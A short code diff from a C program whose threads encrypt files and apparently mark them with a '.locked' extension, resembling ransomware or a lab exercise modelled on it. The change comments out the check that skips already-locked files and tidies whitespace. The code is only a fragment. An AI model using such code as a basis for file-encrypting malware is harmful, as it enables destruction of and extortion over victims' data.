@@ -16,11 +16,12 @@ void start_encrypt() {
         if (data == NULL){
             break;
         }
-                
+          
+        /*
         if (strstr(data, ".locked") != NULL) {
             free(data);
             continue;
-        }
+        }*/
 
         printf("TID: %lu: \n%s\n", (unsigned long)pthread_self(), data);
         unsigned char key[16];
@@ -32,7 +33,7 @@ void start_encrypt() {
             free(filename);
         }
         free(data);
-            }
+    }
 }
 
 void start_decrypt() {
